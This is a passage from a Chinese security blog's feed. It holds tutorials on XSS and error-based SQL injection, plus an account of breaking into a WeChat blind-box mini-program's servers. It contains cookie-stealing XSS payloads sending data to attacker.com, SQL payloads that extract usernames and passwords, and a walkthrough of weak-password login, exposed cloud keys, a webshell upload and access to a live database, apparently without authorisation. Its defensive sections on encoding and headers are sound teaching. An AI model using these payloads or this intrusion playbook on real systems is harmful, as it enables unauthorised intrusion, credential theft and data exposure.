class="line">&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="5-漏洞挖掘"><a href="#5-漏洞挖掘" class="headerlink" title="5. 漏洞挖掘"></a>5. 漏洞挖掘</h3><h4 id="5-1-黑盒测试"><a href="#5-1-黑盒测试" class="headerlink" title="5.1 黑盒测试"></a>5.1 黑盒测试</h4><blockquote><p>URL 参数<br>表单输入<br>搜索框<br>评论系统<br>个人信息页面</p></blockquote><h4 id="5-2-白盒测试"><a href="#5-2-白盒测试" class="headerlink" title="5.2 白盒测试"></a>5.2 白盒测试</h4><blockquote><p>检查输入处理函数<br>检查输出编码<br>检查 DOM 操作<br>检查 JavaScript 事件处理</p></blockquote><h4 id="5-3-常见业务场景"><a href="#5-3-常见业务场景" class="headerlink" title="5.3 常见业务场景"></a>5.3 常见业务场景</h4><blockquote><p>重灾区：评论区、留言区、个人信息、订单信息等<br>针对型：站内信、网页即时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性等</p></blockquote><h4 id="5-4-漏洞查找方法"><a href="#5-4-漏洞查找方法" class="headerlink" title="5.4 漏洞查找方法"></a>5.4 漏洞查找方法</h4><h5 id="基本验证¶"><a href="#基本验证¶" class="headerlink" title="基本验证¶"></a>基本验证<a href="https://wilesangh.github.io/ctf-web/xss_guide/#_6">¶</a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;</span><br><span class="line">&quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e</span><br><span class="line">&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">%00&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="DOM-型-XSS-查找"><a href="#DOM-型-XSS-查找" class="headerlink" title="DOM 型 XSS 查找"></a>DOM 型 XSS 查找</h5><p>检查以下危险的 DOM 属性和 API：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.location`</span><br><span class="line">`document.URL`</span><br><span class="line">`document.URLUnencoded`</span><br><span class="line">`document.referrer`</span><br><span class="line">`window.location</span><br></pre></td></tr></table></figure></blockquote><p>检查以下危险的 JavaScript 操作：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.write()` / `document.writeln()`</span><br><span class="line">`document.body.innerHTML`</span><br><span class="line">`eval()`</span><br><span class="line">`window.execScript()`</span><br><span class="line">`window.setInterval()` / `window.setTimeout()</span><br></pre></td></tr></table></figure></blockquote><h3 id="6-防御措施"><a href="#6-防御措施" class="headerlink" title="6. 防御措施"></a>6. 防御措施</h3><h4 id="6-1-输入验证"><a href="#6-1-输入验证" class="headerlink" title="6.1 输入验证"></a>6.1 输入验证</h4><blockquote><p>长度限制<br>字符白名单<br>正则表达式过滤</p></blockquote><h4 id="6-2-输出编码"><a href="#6-2-输出编码" class="headerlink" title="6.2 输出编码"></a>6.2 输出编码</h4><blockquote><p>HTML 实体编码<br>JavaScript 编码<br>URL 编码</p></blockquote><h4 id="6-3-安全响应头"><a href="#6-3-安全响应头" class="headerlink" title="6.3 安全响应头"></a>6.3 安全响应头</h4><blockquote><p>Content-Security-Policy<br>X-XSS-Protection<br>X-Content-Type-Options</p></blockquote><h4 id="6-4-其他措施"><a href="#6-4-其他措施" class="headerlink" title="6.4 其他措施"></a>6.4 其他措施</h4><blockquote><p>使用 HttpOnly Cookie<br>实施 CSRF 令牌<br>使用安全的框架和库</p></blockquote><h4 id="6-5-DOM-型防御"><a href="#6-5-DOM-型防御" class="headerlink" title="6.5 DOM 型防御"></a>6.5 DOM 型防御</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 输入验证</span><br><span class="line">var a = document.URL;</span><br><span class="line">a = a.substring(a.indexOf(&quot;message=&quot;) + 8);</span><br><span class="line">a = unescape(a);</span><br><span class="line">var regex = /^([A-Za-z0-9\s]+)$/;</span><br><span class="line">if (regex.test(a)) &#123;</span><br><span class="line">    document.write(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 输出编码</span><br><span class="line">function reinit(str) &#123;</span><br><span class="line">    var d = document.createElement(&#x27;div&#x27;);</span><br><span class="line">    d.appendChild(document.createTextNode(str));</span><br><span class="line">    return d.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-实战案例"><a href="#7-实战案例" class="headerlink" title="7. 实战案例"></a>7. 实战案例</h3><h4 id="7-1-反射型-XSS-利用"><a href="#7-1-反射型-XSS-利用" class="headerlink" title="7.1 反射型 XSS 利用"></a>7.1 反射型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;https://attacker.com/steal?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="7-2-存储型-XSS-利用"><a href="#7-2-存储型-XSS-利用" class="headerlink" title="7.2 存储型 XSS 利用"></a>7.2 存储型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;https://attacker.com/steal?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure><h4 id="7-3-DOM-型-XSS-利用"><a href="#7-3-DOM-型-XSS-利用" class="headerlink" title="7.3 DOM 型 XSS 利用"></a>7.3 DOM 型 XSS 利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;div.layui-table-cell&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;flag&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h2&gt;&lt;p&gt;XSS (Cross-Site Scripting) 是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使得其他用户在访问该页面时执行这些脚本。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="https://heisha123.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>实战-关于微信小程序盲盒</title>
    <link href="https://heisha123.github.io/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/"/>
    <id>https://heisha123.github.io/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/</id>
    <published>2025-07-13T04:45:46.000Z</published>
    <updated>2025-08-25T07:20:34.163Z</updated>
    
    <content type="html"><![CDATA[<p>进入微信，搜索盲盒小程序发现有很多的小程序</p><span id="more"></span><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713124718273.png" alt="image-20250713124718273"></p><p>这里我们用黄鸟抓包，找到相应的地址</p><p>去fofa 收集子域名</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713140502292.png" alt="image-20250713140502292"></p><p>找到了一个测试站点</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713140543354.png" alt="image-20250713140543354"></p><p>弱密码登录，很幸运，直接登录成功</p><p>tips：如果没有成功登录，可以用密码喷洒</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713140639212.png" alt="image-20250713140639212"></p><p>接下来就是 看看这几个板块有没有利用点</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713140808417.png" alt="image-20250713140808417"></p><p>ak ，sk暴露，这里是测试站点，我也去试了连接，但是连接不上</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713140851926.png" alt="image-20250713140851926"></p><p>在盒子这里也有一个利用点</p><p>可能存在文件上传</p><p>我们上传图片，拦截修改后缀 发现后端没有过滤php，成功上传我们的shell</p><p>连接蚁剑</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713141141936.png" alt="image-20250713141141936"></p><p>后面进行代码审计，发现他还有一个new的站在运行</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713141220732.png" alt="image-20250713141220732"></p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713141251134.png" alt="image-20250713141251134"></p><p>也成功找到了mysql连接文件，很可能他上线就是这个数据库，连接看一下</p><p><img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713141439475.png" alt="image-20250713141439475"></p><p>2000多个，可能还在测试中</p><p>看看unix时间戳 <img src="/2025/07/13/%E5%AE%9E%E6%88%98-%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9B%B2%E7%9B%92/image-20250713141527709.png" alt="image-20250713141527709"></p><p>这套代码可能还有其他的漏洞，还需要进行更细致的代码审计</p><p>总结：</p><p>信息收集很重要</p><p>弱口令爆破别忘掉</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;进入微信，搜索盲盒小程序发现有很多的小程序&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="实战" scheme="https://heisha123.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>sql注入-报错注入</title>
    <link href="https://heisha123.github.io/2025/07/13/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://heisha123.github.io/2025/07/13/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2025-07-13T04:14:31.000Z</published>
    <updated>2025-07-13T04:31:02.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="报错注入概念"><a href="#报错注入概念" class="headerlink" title="报错注入概念"></a>报错注入概念</h2><p>数据库在执行SQL语句时，通常会先对SQL进行检测,如果SQL语句存在问题,就会返回错误信息。通过这种机制，我们可以构造恶意的SQL，触发数据库报错，而在报错信息中就存在着我们想要的信息。但通过这种方式，首先要保证SQL结构的正确性。</p><span id="more"></span><p><font color="maroon">1.ST_LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</font></p><p><code>and ST_LatFromGeoHash(concat(0x7e,(),0x7e))--+</code></p><p><font color="maroon">2.ST_LongFromGeoHash（mysql&gt;&#x3D;5.7.x)</font></p><p><code>and ST_LongFromGeoHash(concat(0x7e,(),0x7e))--+</code></p><p><font color="maroon">3.GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</font></p><p>0x01 GTID</p><p>GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p><p>GTID_SUBSET() 和 GTID_SUBTRACT()函数</p><p>0X02 函数详解</p><p>GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错。<br>GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p><p>0x03 注入过程( payload )</p><p>GTID_SUBSET函数</p><p><code>&#39;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+</code></p><p>GTID_SUBTRACT</p><p><code>&#39;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e),1)--+</code></p><p><font color="maroon">4.floor（8.x&gt;mysql&gt;5.0）</font></p><p><code>or (select 1 from (select count(*),concat(0x7e,(),0x7e,floor(rand(0) * 2))x from information_schema.tables group by x)a)--+</code></p><p><font color="maroon">5.ST_Pointfromgeohash (mysql&gt;&#x3D;5.7)</font></p><p><code>or ST_PointFromGeoHash((),1)--+</code></p><p><font color="maroon">6.updatexml</font></p><p><code>and updatexml(1,concat(0x7e,(),0x7e),1) --+</code>一共可以接收三个参数，报错位置在第二个参数.</p><p><font color="maroon">7.extractvalue</font></p><p><code>and extractvalue(1,concat(0x7e,())) --+</code>一共可以接收两个参数，报错位置在第二个参数</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;报错注入概念&quot;&gt;&lt;a href=&quot;#报错注入概念&quot; class=&quot;headerlink&quot; title=&quot;报错注入概念&quot;&gt;&lt;/a&gt;报错注入概念&lt;/h2&gt;&lt;p&gt;数据库在执行SQL语句时，通常会先对SQL进行检测,如果SQL语句存在问题,就会返回错误信息。通过这种机制，我们可以构造恶意的SQL，触发数据库报错，而在报错信息中就存在着我们想要的信息。但通过这种方式，首先要保证SQL结构的正确性。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="sql" scheme="https://heisha123.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>XSS反射型注入利用</title>
    <link href="https://heisha123.github.io/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/"/>
    <id>https://heisha123.github.io/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/</id>
    <published>2025-07-12T17:44:42.000Z</published>
    <updated>2025-08-25T07:20:34.382Z</updated>
    
    <content type="html"><![CDATA[<p>XSS主要原因： 过于信任客户端提交的数据！</p><span id="more"></span><p>XSS主要分类：<br>反射型xss攻击（Reflected XSS） 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p><p>存储型XSS（Stored XSS) 又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。</p><p>DOM型XSS，对于DOM型其实和反射性很像，也是能够在网页上快速的进行反映。只是参数是直接传入DOM树使用js来进行执行，只是可以在payload前加“#”，从而使其不发送到服务器端，只发送到浏览器，同样也可以使用img标签代替script标签执行JavaScript脚本。这里暂时不会介绍太多。</p><p>对于反射性比较经典的利用是cookie劫持。比如我们发现了一个反射性xss，它是通过get或者post进行工作，然后我们先搭建一个远程服务器，然后利用反射性重定向至我们的服务器的脚本记录下当前用户访问的cookie进行劫持。<br>自然，这样的难度比较高，首先由于入侵的反射是在response中，那么首先需要诱导用户发起request，建议可以进行一些社工诱导并且进行短链接变换。</p><p>还有就是从社工的思路来操作，比如点击链接后说“请登陆我们的新站点”</p><p>后面当然也有beef的钩子之类的，不过要让用户自己点击，难度还是不小</p><p>对于储存型，一旦出现这样的漏洞是非常危险的，储存在服务器上可以长期对访问用户进行攻击。</p><h1 id="XSS渗透思路"><a href="#XSS渗透思路" class="headerlink" title="XSS渗透思路"></a>XSS渗透思路</h1><h2 id="反射型（owasp-low）"><a href="#反射型（owasp-low）" class="headerlink" title="反射型（owasp-low）"></a>反射型（owasp-low）</h2><p>首先进行弹窗探测：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code><br>查看当前cookie：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713014645185.png" alt="image-20250713014645185"></p><p>探测成功，发现反射性漏洞。<br>接下来进行<code>cookie</code>劫持示例：<br>首先先开个攻击者服务器：<br>（这里我就开了自己的一个服务器，index是显示php版本）</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713014721635.png" alt="image-20250713014721635"></p><p>在服务器上写一个脚本：</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713014733790.png" alt="image-20250713014733790"></p><p>然后植入到xss点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;http://127.0.0.1/cookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>植入之后就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.20.240.17/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;window.open(&quot;http://127.0.0.1/cookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当然你可以先<code>url</code>编码，一旦点击就能够劫持出<code>cookie</code>。<br>值得一提的是很多浏览器的安全策略会禁止不信任的网站弹窗，这种方法的局限性较大，并且url不经过短链接变换是非常可疑的。</p><p>打开空白页，触发脚本（已允许弹窗）</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713014831300.png" alt="image-20250713014831300"></p><p>服务器端捕捉到<code>cookie</code>：</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713014852088.png" alt="image-20250713014852088"></p><p>这里多点了几次 [^_^]<br>这里的利用就到这里</p><h2 id="反射型（owasp-mid）"><a href="#反射型（owasp-mid）" class="headerlink" title="反射型（owasp-mid）"></a>反射型（owasp-mid）</h2><p>探测不起作用了，看看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#x27;name&#x27;] == NULL || $_GET[&#x27;name&#x27;] == &#x27;&#x27;)&#123;  </span><br><span class="line">$isempty = true; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">echo &#x27;&lt;pre&gt;&#x27;; </span><br><span class="line">echo &#x27;Hello &#x27; . str_replace(&#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[&#x27;name&#x27;]); </span><br><span class="line">echo &#x27;&lt;/pre&gt;&#x27;;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这里就是一个<code>str_replace()</code>过滤，显然可以使用双写绕过<br>payload:</p><p><code>&lt;scrip&lt;script&gt;t&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>成功绕过：</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713015058719.png" alt="image-20250713015058719"></p><h2 id="反射型（owasp-high）"><a href="#反射型（owasp-high）" class="headerlink" title="反射型（owasp-high）"></a>反射型（owasp-high）</h2><p>由于版本问题，我这里已经是修复好的。<br>下面是我找到的（应该是版本问题）</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713015145745.png" alt="image-20250713015145745"></p><p>这里就是使用正则进行替换，显然script完全不能使用了。<br>但是能加载<code>js</code>脚本的标签不只有<code>&lt;script&gt;</code>,还有<code>&lt;img&gt;,&lt;iframe&gt;</code></p><p><code>&lt;img src=&quot;&quot; οnerrοr=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p><p>就像这样，利用<code>onerror</code>工作就行。<br>这里给出我的版本，是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    </span><br><span class="line">if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#x27;name&#x27;] == NULL || $_GET[&#x27;name&#x27;] == &#x27;&#x27;)&#123;</span><br><span class="line">    </span><br><span class="line"> $isempty = true;</span><br><span class="line">        </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    </span><br><span class="line"> echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line"> echo &#x27;Hello &#x27; . htmlspecialchars($_GET[&#x27;name&#x27;]);</span><br><span class="line"> echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这里使用了一个关键的函数<code>htmlspecialchars()</code><br>来看看吧；</p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713015300561.png" alt="image-20250713015300561"></p><p><img src="/2025/07/13/XSS%E5%8F%8D%E5%B0%84%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/image-20250713015307385.png" alt="image-20250713015307385"></p><p>这里我们可以注意到 <code>&#39;</code>单引号 默认情况下是 没有转换为实体的 所以有些时候我们也可以利用这一点来进行绕过闭合</p><p>这里多说一点，HTML实体编码 就是，将html可以解析的代码实体化，转化为字符，导致浏览器不能进行解析</p><p>能够转化为实体，大大提高了安全性。 注意设置**<code>ENT_QUOTES</code>**  参数</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;XSS主要原因： 过于信任客户端提交的数据！&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="https://heisha123.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>渗透的基本思路</title>
    <link href="https://heisha123.github.io/2025/07/13/%E6%B8%97%E9%80%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>https://heisha123.github.io/2025/07/13/%E6%B8%97%E9%80%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2025-07-12T17:29:31.000Z</published>
    <updated>2025-07-13T04:44:48.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入侵基本流程"><a href="#入侵基本流程" class="headerlink" title="入侵基本流程"></a>入侵基本流程</h2><p>1.收集资产   （子域名，小程序，等）</p><p>2.一般从分站入手，比如测试站点，从测试站通过弱口令爆破（密码喷洒），接口泄露等 进入后台，看是否有文件上传，文件包含等利用点，能上传webshell，从而拿到网站源码</p><p>3.代码审计，找到可利用的点，对主站进行渗透</p><p>4.或者可以找到AK,SK，等等 都可以进行利用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;入侵基本流程&quot;&gt;&lt;a href=&quot;#入侵基本流程&quot; class=&quot;headerlink&quot; title=&quot;入侵基本流程&quot;&gt;&lt;/a&gt;入侵基本流程&lt;/h2&gt;&lt;p&gt;1.收集资产   （子域名，小程序，等）&lt;/p&gt;
&lt;p&gt;2.一般从分站入手，比如测试站点，从测试站通过弱口令</summary>
      
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>url编码，unicode编码，html实体化编码</title>
    <link href="https://heisha123.github.io/2025/07/13/url%E7%BC%96%E7%A0%81%EF%BC%8Cunicode%E7%BC%96%E7%A0%81%EF%BC%8Chtml%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BC%96%E7%A0%81/"/>
    <id>https://heisha123.github.io/2025/07/13/url%E7%BC%96%E7%A0%81%EF%BC%8Cunicode%E7%BC%96%E7%A0%81%EF%BC%8Chtml%E5%AE%9E%E4%BD%93%E5%8C%96%E7%BC%96%E7%A0%81/</id>
    <published>2025-07-12T16:04:46.553Z</published>
    <updated>2025-07-14T03:29:40.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTML实体编码和Unicode"><a href="#HTML实体编码和Unicode" class="headerlink" title="[HTML实体编码和Unicode]"></a>[HTML实体编码和Unicode]</h2><span id="more"></span><p>HTML实体编码和Unicode是处理字符和符号的两种常见方法。HTML实体编码用于在HTML文档中显示特殊字符，而Unicode是一种将字符映射为数字的标准。</p><p>HTML实体编码</p><p>HTML实体编码是一种用特殊字符代替正常字符的方法，以确保在HTML文档中正确显示这些字符。HTML实体以“&amp;”符号开始，以“;”符号结束。例如，HTML实体“&lt;”代表“&lt;”字符，“&amp;”代表“&amp;”字符。</p><p>关键字实体</p><p>关键字实体涵盖了最常见的字符，并且被大多数浏览器所识别。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">© &lt;!-- 版权符号，产生© --&gt;</span><br><span class="line"></span><br><span class="line">™ &lt;!-- 商标符号，产生™ --&gt;</span><br><span class="line"></span><br><span class="line">° &lt;!-- 度，产生° --&gt;</span><br></pre></td></tr></table></figure><p>十进制实体</p><p>并非每个字符都有一个关键字实体。每个字符还具有一个十进制实体：用数字编写的代码。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">↺ &lt;!-- 空心圆顺时针箭头，产生↺ --&gt;</span><br><span class="line"></span><br><span 